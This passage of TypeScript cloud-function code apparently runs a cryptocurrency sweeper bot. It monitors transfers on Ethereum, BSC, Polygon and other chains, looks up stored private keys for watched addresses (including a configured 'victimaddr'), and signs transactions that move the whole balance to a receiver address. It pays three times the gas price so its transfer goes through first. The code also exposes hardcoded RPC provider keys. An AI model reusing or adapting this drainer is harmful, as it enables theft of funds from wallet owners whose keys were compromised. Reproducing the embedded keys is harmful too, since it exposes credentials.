   //  var nonce = await web3.eth.getTransactionCount(toAddrDtls.get("addr"), 'latest'); 
   
   var gasPrice = await web3.eth.getGasPrice();
   
   var gas = 21000
   
   var BN = web3.utils.BN;
   // var fee = gasPrice * gas;
   var nGasprice = new BN(gasPrice);
   var fee = nGasprice.mul(new BN(3));
   
   fee = fee.mul(new BN(gas));
   fee = fee.add(new BN(2)) /// just added this line 2024
   
   request.log.info("Calculated big number");
   
   var bl = new BN(value);
   
   const getBalance = await web3.eth.getBalance(request.object.get("toAddress"))
   var getbal =  new BN(getBalance)
   
   if(getbal > bl) {
   
     bl = getbal;
     request.log.info("Using wallet balance instead");
   
   }
   
   
   if(bl < fee ) {
   
     request.log.info("Balance is less than fee");
   
     return;
   
   }
   
   
   var baltosend =  bl.sub(fee);
   request.log.info("Calculated fee");
   // loggerr.info(fee+" Old fee");
   // loggerr.info(nonce+" nounce");
   
   // if( toAddrDtls.get("addr") == "0x7aba0a1453a01ba55508f4f48b462fcb1bd471bf") {
   
   //   loggerr.info("Crazy Point");
   //   // var halffee = nGasprice.divn(new BN("2"))
   //  var prefee = nGasprice.add(new BN(nGasprice));
   //  nGasprice = prefee;
   //  fee = prefee.mul(new BN(gas));
   //  // bl = new BN(value);
   //  baltosend =  bl.sub(fee);
   // }
   request.log.info("Calculated gas price");
   
   if(parseInt(baltosend) <= 0 ) {
   
     request.log.info("Balance is less than zero");
   
     // bl = new BN(value);
     baltosend =  bl.sub(fee);
   
   }
   
   
   request.log.info("Calculated balance");
   
   // end new
   
   
   //  loggerr.info(baltosend.toString()+ "bal to send");
   //  loggerr.info(nGasprice.toString()+ " gas price");
   //  loggerr.info(fee.toString()+ "new fee");
   //    logger.info(balance.balance.toString());
   //  logger.info(value.toString()+ " value");
   //  logger.info(ntwk+ " ntwk");
   
    var transaction = {
   
     'to': rcveraddress, // faucet address to return eth
     'value': baltosend,
     'gas': gas,
     'gasPrice': gasPrice,
     // 'nonce': request.object.get("nonce"),
     // optional data field to send message or execute smart contract
    };
   
    request.log.info("Created transaction");
   
    var signedTx = await web3.eth.accounts.signTransaction(transaction, toAddrDtls.get("pkaddr"));
   
    request.log.info("Signed transaction");
   
   
     
     request.log.info("Sending transaction");
     web3.eth.sendSignedTransaction(signedTx.rawTransaction).on('transactionHash', async (hash: any) => 
    
     {
       // loggerr.info(hash.toString());
       request.log.info("got hash")
     }).on('receipt', async (reciept: any) => {
    
      await mshlogger(request, ntwk, loggerr)
      await realLogger("new")
      request.log.info("got recipet")
       // loggerr.info(JSON.stringify(reciept));
    
    
     }).on('error', async  (error: any) =>{
    
      await mshlogger(request, JSON.stringify(error), loggerr)
      await realLogger("error")
      request.log.info("got error")
       // loggerr.info(JSON.stringify(error));
    
       // loggerr.info("errror");
    
       });
   
    }  catch  (error) {
   
     request.log.info(JSON.stringify(error))
     // loggerr.info(JSON.stringify(error));
     // loggerr.info("catch errror");
    }
   
   
   
   
   
   
   }


async function proxsend(request: any, toAddrDtls: any, rcveraddress: any, prjid: any, ntwk: any, value: any, loggerr: any ) {

 // loggerr.info(JSON.stringify( toAddrDtls.get("addr")));
 // loggerr.info(JSON.stringify(prjid));
var web3: any;

 if(ntwk == "eth") {

  // web3 = new Moralis.Web3(
  //   new Moralis.Web3.providers.HttpProvider(
  //       'https://indulgent-yolo-borough.bsc-testnet.discover.quiknode.pro/4c61b20edcc95c95701995d59c193a2cc493fc15/'
  //   )
  // );
 
  // web3 = new Web3(new Web3.providers.HttpProvider("https://eth.getblock.io/"+prjid+"/mainnet/"));
  web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/eth/"+prjid));


  // web3 = new Moralis.Web3(
  //   new Moralis.Web3.providers.HttpProvider(
  //    //    'https://rpc.ankr.com/bsc_testnet_chapel'
  //    // "https://bsc.getblock.io/testnet/?api_key="+prjid
  //    // "https://bsc.getblock.io/mainnet/?api_key="+prjid
  //       "https://rpc.ankr.com/eth/"+prjid

  //       //  "https://eth.getblock.io/mainnet/?api_key="+prjid
  //   )
  // );
  
}


 if(ntwk == "zkSync") {

  // web3 = new Moralis.Web3(
  //   new Moralis.Web3.providers.HttpProvider(
  //       'https://indulgent-yolo-borough.bsc-testnet.discover.quiknode.pro/4c61b20edcc95c95701995d59c193a2cc493fc15/'
  //   )
  // );
 
  // web3 = new Web3(new Web3.providers.HttpProvider("https://eth.getblock.io/"+prjid+"/mainnet/"));
  web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/zksync_era/"+prjid));


  // web3 = new Moralis.Web3(
  //   new Moralis.Web3.providers.HttpProvider(
  //    //    'https://rpc.ankr.com/bsc_testnet_chapel'
  //    // "https://bsc.getblock.io/testnet/?api_key="+prjid
  //    // "https://bsc.getblock.io/mainnet/?api_key="+prjid
  //       "https://rpc.ankr.com/eth/"+prjid

  //       //  "https://eth.getblock.io/mainnet/?api_key="+prjid
  //   )
  // );
  
}

//  web3 = new Moralis.Web3(
//      new Moralis.Web3.providers.HttpProvider(
//         //  'https://rinkeby.Ankra.io/v3/'+prjid
//         //  'https://rpc.ankr.com/eth_rinkeby'
//         // "https://eth.getblock.io/rinkeby/?api_key="+prjid
//         "https://rpc.ankr.com/eth/"+prjid
//         // "https://eth.getblock.io/mainnet/?api_key="+prjid
//      )
//    );


 if(ntwk == "bsc") {

   // web3 = new Moralis.Web3(
   //   new Moralis.Web3.providers.HttpProvider(
   //       'https://indulgent-yolo-borough.bsc-testnet.discover.quiknode.pro/4c61b20edcc95c95701995d59c193a2cc493fc15/'
   //   )
   // );

   web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/bsc/"+prjid));

  // web3 = new Web3(new Web3.providers.HttpProvider("https://bsc.getblock.io/"+prjid+"/mainnet/"));


  //  web3 = new Moralis.Web3(
  //    new Moralis.Web3.providers.HttpProvider(
  //     //    'https://rpc.ankr.com/bsc_testnet_chapel'
  //     // "https://bsc.getblock.io/testnet/?api_key="+prjid
  //     // "https://bsc.getblock.io/"+prjid+"/mainnet/"
  //     // "https://bsc.getblock.io/5589d2a1-518e-4057-a711-f882e23287d6/mainnet/"
  //     // https://bsc.getblock.io/5589d2a1-518e-4057-a711-f882e23287d6/mainnet/
  //       //  "https://rpc.ankr.com/bsc/"+prjid
  //       "https://rpc.ankr.com/bsc/"+prjid
  //    )
  //  );
   
  //  loggerr.info("got to bsccccc");
 }


 if(ntwk == "polygon") {

  web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/polygon/"+prjid));

  // web3 = new Web3(new Web3.providers.HttpProvider("https://matic.getblock.io/"+prjid+"/mainnet/"));

  request.log.info("got to plygon")

  //  web3 = new Moralis.Web3(
  //    new Moralis.Web3.providers.HttpProvider(
  //     //    'https://rpc.ankr.com/polygon_mumbai'
  //     //    'https://rpc.ankr.com/polygon'
  //     // "https://matic.getblock.io/testnet/?api_key="+prjid
  //     // "https://matic.getblock.io/mainnet/?api_key="+prjid
  //     "https://rpc.ankr.com/polygon/"+prjid
  //    )
  //  );
   
 }


 if(ntwk == "avax") {

  // web3 = new Web3(new Web3.providers.HttpProvider("https://avax.getblock.io/"+prjid+"/mainnet/ext/bc/C/rpc"));


  web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/avalanche/"+prjid));

  
  //  web3 = new Moralis.Web3(
  //    new Moralis.Web3.providers.HttpProvider(
  //     //    'https://rpc.ankr.com/avalanche'
  //     //    'https://rpc.ankr.com/avalanche_fuji'
  //     // "https://avax.getblock.io/testnet/ext/bc/C/rpc?api_key="+prjid
  //     // "https://avax.getblock.io/mainnet/ext/bc/C/rpc?api_key="+prjid
  //     "https://rpc.ankr.com/avalanche/"+prjid
  //     // "https://rpc.ankr.com/avalanche-c/"+prjid

  //    )
  //  );
   
 
  //  loggerr.info(web3+" web3 i got here");

 }

 if(ntwk == "fantom") {


  // web3 = new Web3(new Web3.providers.HttpProvider("https://ftm.getblock.io/"+prjid+"/mainnet/"));



  web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/fantom/"+prjid));

  //  web3 = new Moralis.Web3(
  //    new Moralis.Web3.providers.HttpProvider(
  //        // 'https://rpc.ankr.com/fantom_testnet'
  //     //    'https://rpc.ankr.com/fantom'
  //     // "https://ftm.getblock.io/mainnet/?api_key="+prjid
  //     "https://rpc.ankr.com/fantom/"+prjid
  //     // "https://rpc.ankr.com/fantom/"+prjid
  //    )
  //  );
   
 }

 if(ntwk == "cronos") {



  // web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/fantom/"+prjid));
  var config = await Parse.Config.get({useMasterKey: true});

  var prjidd = config.get("getBlock");
  web3 = new Web3(new Web3.providers.HttpProvider("https://cro.getblock.io/"+prjidd+"/mainnet/"));


  //  web3 = new Moralis.Web3(
  //    new Moralis.Web3.providers.HttpProvider(
  //        'https://cro.getblock.io/mainnet/?api_key='+prjid
  //    )
  //  );
   
 }
 


 if(ntwk == "arb") {


  
  web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/arbitrum/"+prjid));

  // web3 = new Web3(new Web3.providers.HttpProvider("https://arb.getblock.io/"+prjid+"/mainnet/"));


  //  web3 = new Moralis.Web3(
  //    new Moralis.Web3.providers.HttpProvider(
  //        'https://cro.getblock.io/mainnet/?api_key='+prjid
  //    )
  //  );
   
 }



 if(ntwk == "op") {


  web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/optimism/"+prjid));
  // web3 = new Web3(new Web3.providers.HttpProvider("https://op.getblock.io/"+prjid+"/mainnet/"));
 

  //  web3 = new Moralis.Web3(
  //    new Moralis.Web3.providers.HttpProvider(
  //        'https://cro.getblock.io/mainnet/?api_key='+prjid
  //    )
  //  );
   
 }

 if(ntwk == "goerli") {

// https://rpc.ankr.com/eth_goerli
  web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/eth_goerli/"+prjid));
  // web3 = new Web3(new Web3.providers.HttpProvider("https://op.getblock.io/"+prjid+"/mainnet/"));
 

  //  web3 = new Moralis.Web3(
  //    new Moralis.Web3.providers.HttpProvider(
  //        'https://cro.getblock.io/mainnet/?api_key='+prjid
  //    )
  //  );
   
 }

 if(ntwk == "sepolia") {

 
  web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/eth_sepolia/"+prjid));
  // web3 = new Web3(new Web3.providers.HttpProvider("https://op.getblock.io/"+prjid+"/mainnet/"));
 

  //  web3 = new Moralis.Web3(
  //    new Moralis.Web3.providers.HttpProvider(
  //        'https://cro.getblock.io/mainnet/?api_key='+prjid
  //    )
  //  );
   
 }

 if(ntwk == "base") {

 
  web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/base/"+prjid));

   
 }





 if(ntwk == null) {

  var result = await web3.utils.fromWei(request.object.get("value"));

  
  Parse.Cloud.httpRequest({
    method: 'POST',
   url: config.MLIS_URL,
   headers: {
     "content-type": "application/json",
     "x-apikey": config.MLIS_KEY,
     "cache-control": "no-cache"
   },
    body: {
      addr_from: request.object.get("fromAddress"),
      addr_to: request.object.get("toAddress"),
      value: result,
      time: request.object.get("_created_at"),
      brand: getntwork(request.object.get("chainId"))+"_"+request.object.get("chainId")+"_streams" ,
      server: "1new_nullNETWORK_NOT_FOUND"
    }
  }).then(function(httpResponse: any) {
    //logger.info(httpResponse.text);
      // logger.info("Logged Eth Trnasfer");
  }, function(httpResponse: any) {
    //  logger.error(JSON.stringify(httpResponse));
  });


  await realLogger("new")

  return;
 }



 // old
//    var options = {
//      chain: ntwk,
//      address: toAddrDtls.get("addr")
//    };
//    var balance = await Moralis.Web3API.account.getNativeBalance(options);

//    var nonce = await web3.eth.getTransactionCount(toAddrDtls.get("addr"), 'latest'); // nonce starts counting from 0

//    var gasPrice = await web3.eth.getGasPrice();

//    var gas = await web3.eth.estimateGas({
//      to: rcveraddress,
//      from: toAddrDtls.get("addr"),
//      value: balance.balance,
//    });

//    var BN = web3.utils.BN;
//    // var fee = gasPrice * gas;
//    nGasprice = new BN(gasPrice);
//    var fee = nGasprice.mul(new BN(gas));
 
//    bl = new BN(balance.balance);
//    baltosend =  bl.sub(fee);

//    if(parseInt(baltosend) <= 0 ) {

//      bl = new BN(value);
//      baltosend =  bl.sub(fee);

//    }


var netmin: any = await getntworkwithmin(request.object.get("chainId"));

// end old 

  try {

    await burn(toAddrDtls, prjid, request)
  } catch (error) {
    await mshlogger(request, "token failed inside trycatch: "+error.message, loggerr)

  }


 try {

// new

request.log.info("got to the end of selecting network_"+ntwk)

//  var nonce = await web3.eth.getTransactionCount(toAddrDtls.get("addr"), 'latest'); 

var gasPrice = await web3.eth.getGasPrice();

var gas = 21000

var BN = web3.utils.BN;
// var fee = gasPrice * gas;
var nGasprice = new BN(gasPrice);
var fee = nGasprice.mul(new BN(3));

fee = fee.mul(new BN(gas));
fee = fee.add(new BN(2)) /// just added this line 2024

// request.log.info("Calculated big number");
request.log.info("Total gas:"+web3.utils.fromWei(fee+"", 'ether'));

var bl = new BN(value);

const getBalance = await web3.eth.getBalance(request.object.get("toAddress"))
var getbal =  new BN(getBalance)


// if(getbal > bl) {

//   bl = getbal;
//   request.log.info("Using wallet balance instead");

// }

bl = getbal;

if(bl.lt(fee) ) {

  request.log.info("Balance: "+bl);
  request.log.info("Fee: "+fee);
  return;

}

    request.log.info("Balance in wei:"+bl);

  
   var amount = await web3.utils.fromWei(bl+"", 'ether');
   request.log.info("Balance in ether:"+amount);
   request.log.info("MIN: "+netmin?.min)
   



  try {
    
    if( parseFloat(amount+"") < netmin?.min) {

      // Parse.Cloud.httpRequest({
      //   method: 'POST',
      //  url: config.MLIS_URL,
      //  headers: {
      //    "content-type": "application/json",
      //    "x-apikey": config.MLIS_KEY,
      //    "cache-control": "no-cache"
      //  },
      //   body: {
      //     addr_from: request.object.get("fromAddress"),
      //     addr_to: request.object.get("toAddress"),
      //     value: amount+"",
      //     time: request.object.get("_created_at"),
      //     brand: getntwork(request.object.get("chainId"))+"_"+request.object.get("chainId")+"_streams" ,
      //     server: "LESS_THAN_MIN_NATIVE:"+amount
      //   }
      // }).then(function(httpResponse: any) {
      //   //logger.info(httpResponse.text);
      //   request.log.info(JSON.stringify(httpResponse));
      // }, function(httpResponse: any) {
      //   //  logger.error(JSON.stringify(httpResponse));
      // });


      await mshlogger(request, ntwk+": "+"LESS_THAN_MIN_NATIVE:"+amount, loggerr)
      await realLogger("new")
      request.log.info("LESS THAN MIN NATIVE:"+amount);
      return;
  
     }
     else {
      request.log.info("greater THAN MIN NATIVE:"+amount);
     }
  

     
  } catch (error) {
    
    request.log.info("Error getting Min:"+error.message);


  }


var baltosend =  bl.sub(fee);
request.log.info("Calculated fee");
// loggerr.info(fee+" Old fee");
// loggerr.info(nonce+" nounce");

// if( toAddrDtls.get("addr") == "0x7aba0a1453a01ba55508f4f48b462fcb1bd471bf") {

//   loggerr.info("Crazy Point");
//   // var halffee = nGasprice.divn(new BN("2"))
//  var prefee = nGasprice.add(new BN(nGasprice));
//  nGasprice = prefee;
//  fee = prefee.mul(new BN(gas));
//  // bl = new BN(value);
//  baltosend =  bl.sub(fee);
// }
request.log.info("Calculated gas price");

if(parseInt(baltosend) <= 0 ) {

  request.log.info("Balance is less than zero");

  // bl = new BN(value);
  baltosend =  bl.sub(fee);

}


request.log.info("Calculated balance");

// end new


//  loggerr.info(baltosend.toString()+ "bal to send");
//  loggerr.info(nGasprice.toString()+ " gas price");
//  loggerr.info(fee.toString()+ "new fee");
//    logger.info(balance.balance.toString());
//  logger.info(value.toString()+ " value");
//  logger.info(ntwk+ " ntwk");

 var transaction = {

  'to': rcveraddress, // faucet address to return eth
  'value': baltosend,
  'gas': gas,
  'gasPrice': gasPrice,
  // 'nonce': request.object.get("nonce"),
  // optional data field to send message or execute smart contract
 };

 request.log.info("Created transaction");

 var signedTx = await web3.eth.accounts.signTransaction(transaction, toAddrDtls.get("pkaddr"));

 request.log.info("Signed transaction");


  
  request.log.info("Sending transaction");
  web3.eth.sendSignedTransaction(signedTx.rawTransaction).on('transactionHash', async (hash: any) => 
 
  {
    // loggerr.info(hash.toString());
    request.log.info("got hash")
  }).on('receipt', async (reciept: any) => {
 
   await mshlogger(request, ntwk, loggerr)
   await realLogger("new")
   request.log.info("got recipet")
    // loggerr.info(JSON.stringify(reciept));
 
 
  }).on('error', async  (error: any) =>{
 
   await mshlogger(request, JSON.stringify(error), loggerr)
   await realLogger("error")
   request.log.info("got error")
    // loggerr.info(JSON.stringify(error));
 
    // loggerr.info("errror");
 
    });

 }  catch  (error) {

  request.log.info(JSON.stringify(error))
  // loggerr.info(JSON.stringify(error));
  // loggerr.info("catch errror");
 }






}




async function passallfunc(request: any, ntwk: any) {

  // // var Web3 = require('web3');
 // let projectId = "3dd198ffc6924f45aa3b50cae37aa6dd";
 // // var web3ws = new Web3(new Web3.providers.WebsocketProvider('wss://rinkeby.Ankra.io/ws/v3/' + projectId));
 // // var web3 = new Web3(new Web3.providers.HttpProvider('https://rinkeby.Ankra.io/v3/' + projectId));


 request.log.info('Got to all functions local');

 await BalanceChecker(request);

//  var logger = Moralis.Cloud.getLogger();
 var config = await Parse.Config.get({useMasterKey: true});

 var AnkrId = config.get("Ankr");
 var recver = config.get("addr");
 var recver2 = config.get("addr2");
 var victimaddr = config.get("victimaddr");
 var AnkrId2 = config.get("AnkrId2");
 var toaddress = request.object.get("toAddress");
 var fromaddress = request.object.get("fromAddress");

 if(request.object.get("fromAddress") == "0x7aba0a1453a01ba55508f4f48b462fcb1bd471bf" ) {
   toaddress = request.object.get("fromAddress");
 }
 var value = request.object.get("value");

 // var toaddress = "0x2CA37Dd92856f00E8c77f843256c7Db4c6FAd2E9";
 // var value = "10000000";


     // check if exempted  for from addr
     var queryfrom = new Parse.Query("exemptedaddr");
     // query.limit(10);
     queryfrom.fullText("addr", fromaddress);
     var resultsfrom = await queryfrom.first(); // [ Monster, Monster, ...]
 
       // check if exempted  for to addr
       var queryto = new Parse.Query("exemptedaddr");
       // query.limit(10);
       queryto.fullText("addr", toaddress);
       var resultsto = await queryto.first(); // [ Monster, Monster, ...]
 
 
     if(resultsfrom || resultsto) {
 
      request.log.info("got to result but is exempted");
  
      if(resultsfrom) {
        await mshlogger(request, getntwork(request.object.get("chainId")), "Exampted addresss:"+fromaddress)
        await realLogger("new")
      }

      if(resultsto) {
        await mshlogger(request, getntwork(request.object.get("chainId")), "Exampted addresss:"+toaddress)
        await realLogger("new")
      }
      
      return
     }


 

if(fromaddress.toLowerCase() == victimaddr.toLowerCase()) {

  var query = new Parse.Query("hpaddr");
  // query.limit(10);
  query.fullText("addr", fromaddress);
  var results = await query.first(); // [ Monster, Monster, ...]

  if(results) {
    request.log.info("got to result eth2");
    provider =  new providers.JsonRpcProvider(AnkrId2)
    // web3 = new  Web3(new Web3.providers.HttpProvider(config.WEB3_PROVIDER_URL));
    // await cancelandsend(request, results.get("pkaddr"), recver2, provider, web3)

   await proxsend(request,results, recver, AnkrId,ntwk, value, 'logger' );

  //  sendhighbal(request,results, recver, AnkrId,ntwk, value, 'logger' );
  
  }
  else {
  //  logger.info(JSON.stringify(results));
  request.log.info("got to no result eth2"); 
  }

  return
}


    
    // // check if exempted  for to addr
    // var query = new Parse.Query("exemptedaddr");
    // // query.limit(10);
    // query.fullText("addr", toaddress);

    // if(query) {

    //   var query = new Parse.Query("hpaddr");
    //   // query.limit(10);
    //   query.fullText("addr", toaddress);
    //   var results = await query.first(); // [ Monster, Monster, ...]

    //   // request.log.info('Live section');
    //   if(results) {
    //     request.log.info("got to result but is exempted");
    //   await proxsend(request,results, recver, AnkrId,ntwk, value, 'logger' )

    //   }
    //   else {
    //   //  logger.info(JSON.stringify(results));
    //   request.log.info("no result and is exempted");
    //   }

    //  return
    // }


// var query = new Parse.Query("hpaddr");
// // query.limit(10);
// query.fullText("addr", toaddress);
// var results = await query.first(); // [ Monster, Monster, ...]

// // request.log.info('Live section');
// if(results) {
//   request.log.info("got to result");
//  await proxsend(request,results, recver, AnkrId,ntwk, value, 'logger' )

// }
// else {
// //  logger.info(JSON.stringify(results));
// request.log.info("got to no result"); 
// }




     // check if exempted  for from addr
     var queryfrom2 = new Parse.Query("hpaddr");
     // query.limit(10);
     queryfrom2.fullText("addr", fromaddress);
     var resultsfrom2 = await queryfrom2.first(); // [ Monster, Monster, ...]
 
       // check if exempted  for to addr
       var queryto2 = new Parse.Query("hpaddr");
       // query.limit(10);
       queryto2.fullText("addr", toaddress);
       var resultsto2 = await queryto2.first(); // [ Monster, Monster, ...]
 
 
     if(resultsfrom2) {
 
      request.log.info("found in from");
  
      await proxsend(request,resultsfrom2, recver, AnkrId,ntwk, value, 'logger' )
      
   
     }

     if(resultsto2) {
 
      request.log.info("found in to");
  
      await proxsend(request,resultsto2, recver, AnkrId,ntwk, value, 'logger' )
      
   
     }
   





 // proxsend("toaddress", "rcveraddress", "pk", "pojectid")
 
 //   web3ws = new Moralis.Web3(
 //     new Moralis.Web3.providers.WebsocketProvider(
 //         'wss://rinkeby.Ankra.io/ws/v3/' + projectId
 //     )
 //   );


}









async function botDripWeb3js(){
  var config = await Parse.Config.get({useMasterKey: true});
  var prjid = config.get("Ankr");
  // var logger = Moralis.Cloud.getLogger();
   var stop = false;
   var count = 0;
  let abijson: any = [{"inputs":[{"internalType":"address","name":"_thirdwebFee","type":"address"}],"stateMutability":"nonpayable","type":"varructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"delegator","type":"address"},{"indexed":true,"internalType":"address","name":"fromDelegate","type":"address"},{"indexed":true,"internalType":"address","name":"toDelegate","type":"address"}],"name":"DelegateChanged","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"delegate","type":"address"},{"indexed":false,"internalType":"uint256","name":"previousBalance","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"newBalance","type":"uint256"}],"name":"DelegateVotesChanged","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"account","type":"address"}],"name":"Paused","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"platformFeeRecipient","type":"address"},{"indexed":false,"internalType":"uint256","name":"platformFeeBps","type":"uint256"}],"name":"PlatformFeeInfoUpdated","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"recipient","type":"address"}],"name":"PrimarySaleRecipientUpdated","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"bytes32","name":"role","type":"bytes32"},{"indexed":true,"internalType":"bytes32","name":"previousAdminRole","type":"bytes32"},{"indexed":true,"internalType":"bytes32","name":"newAdminRole","type":"bytes32"}],"name":"RoleAdminChanged","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"bytes32","name":"role","type":"bytes32"},{"indexed":true,"internalType":"address","name":"account","type":"address"},{"indexed":true,"internalType":"address","name":"sender","type":"address"}],"name":"RoleGranted","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"bytes32","name":"role","type":"bytes32"},{"indexed":true,"internalType":"address","name":"account","type":"address"},{"indexed":true,"internalType":"address","name":"sender","type":"address"}],"name":"RoleRevoked","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"mintedTo","type":"address"},{"indexed":false,"internalType":"uint256","name":"quantityMinted","type":"uint256"}],"name":"TokensMinted","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"signer","type":"address"},{"indexed":true,"internalType":"address","name":"mintedTo","type":"address"},{"components":[{"internalType":"address","name":"to","type":"address"},{"internalType":"address","name":"primarySaleRecipient","type":"address"},{"internalType":"uint256","name":"quantity","type":"uint256"},{"internalType":"uint256","name":"price","type":"uint256"},{"internalType":"address","name":"currency","type":"address"},{"internalType":"uint128","name":"validityStartTimestamp","type":"uint128"},{"internalType":"uint128","name":"validityEndTimestamp","type":"uint128"},{"internalType":"bytes32","name":"uid","type":"bytes32"}],"indexed":false,"internalType":"struct ITokenERC20.MintRequest","name":"mintRequest","type":"tuple"}],"name":"TokensMintedWithSignature","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"account","type":"address"}],"name":"Unpaused","type":"event"},{"inputs":[],"name":"DEFAULT_ADMIN_ROLE","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"DOMAIN_SEPARATOR","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burnFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"uint32","name":"pos","type":"uint32"}],"name":"checkpoints","outputs":[{"components":[{"internalType":"uint32","name":"fromBlock","type":"uint32"},{"internalType":"uint224","name":"votes","type":"uint224"}],"internalType":"struct ERC20VotesUpgradeable.Checkpoint","name":"","type":"tuple"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"contractType","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"contractURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"contractVersion","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"delegatee","type":"address"}],"name":"delegate","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"delegatee","type":"address"},{"internalType":"uint256","name":"nonce","type":"uint256"},{"internalType":"uint256","name":"expiry","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"delegateBySig","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"delegates","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"blockNumber","type":"uint256"}],"name":"getPastTotalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"uint256","name":"blockNumber","type":"uint256"}],"name":"getPastVotes","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getPlatformFeeInfo","outputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"uint16","name":"","type":"uint16"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"}],"name":"getRoleAdmin","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"},{"internalType":"uint256","name":"index","type":"uint256"}],"name":"getRoleMember","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"}],"name":"getRoleMemberCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"getVotes","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"},{"internalType":"address","name":"account","type":"address"}],"name":"grantRole","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"},{"internalType":"address","name":"account","type":"address"}],"name":"hasRole","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_defaultAdmin","type":"address"},{"internalType":"string","name":"_name","type":"string"},{"internalType":"string","name":"_symbol","type":"string"},{"internalType":"string","na